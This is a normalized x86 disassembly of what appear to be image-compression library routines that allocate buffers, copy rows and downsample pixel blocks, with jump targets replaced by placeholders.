mov [ ebp - 0x118 ] ecx
jmp r-xdata
cmp [ ebp - 0x124 ] 0x40
jge r-xdata
mov eax [ ebp - 0x11c ]
add eax 0x1
mov [ ebp - 0x11c ] eax
jmp r-xdata
mov eax [ ebp - 0x124 ]
mov ecx [ ebp - 0x124 ]
mov edx [ ebp - 0xc ]
fld [ ebp + eax * 4 - 0x10c ]
fmul [ edx + ecx * 4 ]
fst [ ebp - 0x120 ]
fadd [ r--data ]
call _ftol
sub eax 0x4000
mov ecx [ ebp - 0x124 ]
mov edx [ ebp - 0x128 ]
mov [ edx + ecx * 2 ] ax
jmp r-xdata
mov edx [ ebp - 0x110 ]
add edx 0x1
mov [ ebp - 0x110 ] edx
mov eax [ ebp + 0x1c ]
add eax 0x8
mov [ ebp + 0x1c ] eax
mov edx [ ebp - 0x124 ]
add edx 0x1
mov [ ebp - 0x124 ] edx
sub_430ed0
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
and eax 0xff
test eax eax
je r-xdata
push 0x40
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x144 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_430fe0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x154 ]
xor edx edx
mov dl [ ecx + 0x8 ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_431050
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_4312c0
mov ecx [ ebp + 0x8 ]
push ecx
call sub_431530
add esp 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x3c ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xdc ]
push ecx
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x1c ]
shl eax 0x3
mov ecx [ ebp + 0x8 ]
imul eax [ ecx + 0xd8 ]
mov ecx [ ebp - 0xc ]
cdq
idiv [ ecx + 0x8 ]
push eax
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx + 0x8 ]
add esp 0x10
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0x8 ] eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
add eax 0x54
mov [ ebp - 0xc ] eax
sub_430fe0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
mov [ ecx + 0x30 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x34 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xdc ]
shl ecx 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x3c ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x4
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
sub_431050
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144 ]
mov [ ebp - 0x4 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
cmp edx [ ebp + 0x20 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
sub ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + 0xdc ]
sub ecx [ eax + 0x34 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x34 ]
cmp edx [ ecx + 0xdc ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x34 ]
cmp edx [ ecx + 0xdc ]
jge r-xdata
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
push edx
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
lea ecx [ eax + edx * 4 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x150 ]
call [ ecx + 0x4 ]
add esp 0x14
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
add eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x34 ]
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x34 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x30 ]
sub eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x30 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x30 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x1c ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0x18 ]
push edx
push 0x0
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x154 ]
call [ eax + 0x4 ]
add esp 0x14
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x34 ] 0x0
mov edx [ ebp + 0x1c ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x1c ]
mov [ ecx ] eax
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x1c ]
mov ecx [ eax ]
cmp ecx [ ebp + 0x20 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
cmp edx [ ecx + 0x3c ]
jge r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov [ ebp - 0xc ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xdc ]
mov [ eax + 0x34 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xdc ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x34 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x8 ]
push edx
call sub_431270
add esp 0x10
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x3c ]
jge r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0x20 ]
mov [ eax ] ecx
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x20 ]
imul eax [ edx + 0xc ]
push eax
mov ecx [ ebp + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ecx ]
imul eax [ edx + 0xc ]
push eax
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x1c ]
shl edx 0x3
push edx
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x18 ]
mov edx [ ecx + eax * 4 ]
push edx
call sub_431270
add esp 0x10
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x14 ]
add edx 0x54
mov [ ebp - 0x14 ] edx
sub_431270
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0x14 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
push eax
push 0x1
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x10 ]
sub eax 0x1
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_420cc0
add esp 0x18
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_4312c0
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xdc ]
imul eax eax 0x3
mov [ ebp - 0x10 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x30 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx + 0x34 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0x14 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cmp ecx [ eax + 0x3c ]
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x1c ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cmp ecx [ eax + 0x3c ]
jne r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
add edx [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x34 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x30 ]
sub edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x30 ] edx
jmp r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
push ecx
mov edx [ ebp - 0x4 ]
add edx 0x8
push edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
lea eax [ edx + ecx * 4 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x150 ]
call [ eax + 0x4 ]
add esp 0x14
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x30 ]
cmp eax [ edx + 0x20 ]
jne r-xdata
jmp r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ edx ]
push eax
mov ecx [ ebp + 0x18 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x38 ]
push eax
mov ecx [ ebp - 0x4 ]
add ecx 0x8
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x154 ]
call [ ecx + 0x4 ]
add esp 0x14
mov edx [ ebp + 0x1c ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x1c ]
mov [ ecx ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x38 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0xdc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
cmp ecx [ ebp - 0x10 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x3c ]
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
cmp eax [ edx + 0x3c ]
jge r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
cmp edx [ ebp + 0x20 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
cmp ecx [ ebp - 0x10 ]
jl r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov [ edx + 0x34 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x3c ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
push ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x8 ]
push ecx
call sub_431270
add esp 0x10
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0xdc ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x3c ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] 0x0
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
cmp eax [ edx + 0xdc ]
jg r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
push edx
push 0x1
mov eax [ ebp - 0x18 ]
neg eax
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + ecx * 4 + 0x8 ]
push eax
push 0x0
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + ecx * 4 + 0x8 ]
push eax
call sub_420cc0
add esp 0x18
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
sub_431530
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xdc ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
imul edx edx 0x5
imul edx [ ebp - 0x8 ]
shl edx 0x2
push edx
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
cmp edx [ ecx + 0x3c ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
imul eax eax 0x3
push eax
mov ecx [ ebp - 0x14 ]
mov eax [ ecx + 0x1c ]
shl eax 0x3
mov edx [ ebp + 0x8 ]
imul eax [ edx + 0xd8 ]
mov ecx [ ebp - 0x14 ]
cdq
idiv [ ecx + 0x8 ]
push eax
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx + 0x8 ]
add esp 0x10
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x8 ]
imul edx edx 0x3
shl edx 0x2
push edx
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x1c ]
lea eax [ edx + ecx * 4 ]
push eax
call memcpy
add esp 0xc
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x8 ]
jge r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
lea ecx [ eax + edx * 4 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x5
mov edx [ ebp - 0x1c ]
lea eax [ edx + ecx * 4 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
lea edx [ ecx + eax * 2 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
mov esi [ ebp - 0x18 ]
mov edx [ esi + edx * 4 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
lea edx [ ecx + eax * 4 ]
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x18 ]
mov ecx [ esi + ecx * 4 ]
mov [ eax + edx * 4 ] ecx
jmp r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x14 ]
add eax 0x54
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
sub_431680
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov [ ebp - 0x10 ] 0x1
push 0x34
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x154 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_4318b0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_4318c0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0xb3 ]
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x19
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x3c ]
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xb4 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
cmp edx [ ecx + 0xd8 ]
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and ecx 0xff
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x8 ]
shl ecx 0x1
mov edx [ ebp + 0x8 ]
cmp ecx [ edx + 0xd8 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
cmp edx [ ecx + 0xdc ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x63
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax + 0x4 ]
add esp 0x8
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x8 ]
shl eax 0x1
mov ecx [ ebp + 0x8 ]
cmp eax [ ecx + 0xd8 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
cmp edx [ ecx + 0xdc ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xb4 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax [ edx + 0xd8 ]
cdq
idiv [ ecx + 0x8 ]
test edx edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx + 0xc ]
shl eax 0x1
mov ecx [ ebp + 0x8 ]
cmp eax [ ecx + 0xdc ]
jne r-xdata
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0xc ] sub_431bc0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0xc ] sub_431b60
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0xc ] sub_432180
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x26
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax [ edx + 0xdc ]
cdq
idiv [ ecx + 0xc ]
test edx edx
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0xb4 ] 0x0
je r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
add eax 0x54
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0xc ] sub_431960
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0xc ] sub_431ca0
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0xc ] sub_431db0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x1
jmp r-xdata
jmp r-xdata
sub_4318c0
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x154 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x3c ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
mov edx [ ebp + 0x10 ]
lea eax [ ecx + edx * 4 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x18 ]
imul edx [ ecx + 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ecx + eax * 4 ]
lea ecx [ eax + edx * 4 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
call [ ecx + eax * 4 + 0xc ]
add esp 0x10
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x54
mov [ ebp - 0xc ] edx
sub_431960
push ebp
mov ebp esp
sub esp 0x78
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
shl ecx 0x3
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov eax [ edx + 0xd8 ]
cdq
idiv [ ecx + 0x8 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov eax [ edx + 0xdc ]
cdq
idiv [ ecx + 0xc ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
imul edx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x2c ]
imul eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xdc ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
call sub_431ae0
add esp 0x10
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x20 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x20 ]
cmp ecx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x38 ]
add eax [ ebp - 0x18 ]
cdq
idiv [ ebp - 0x14 ]
mov edx [ ebp - 0x34 ]
mov [ edx ] al
mov eax [ ebp - 0x34 ]
add eax 0x1
mov [ ebp - 0x34 ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x20 ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax + edx * 4 ]
add ecx [ ebp - 0x28 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x28 ]
add ecx [ ebp - 0xc ]
mov [ ebp - 0x28 ] ecx
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0xc ]
jge r-xdata
jmp r-xdata
mov ecx [ ebp - 0x30 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x38 ]
add eax edx
mov [ ebp - 0x38 ] eax
mov ecx [ ebp - 0x30 ]
add ecx 0x1
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x1c ]
add edx 0x1
mov [ ebp - 0x1c ] edx
sub_431ae0
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
mov eax [ ebp + 0x14 ]
sub eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
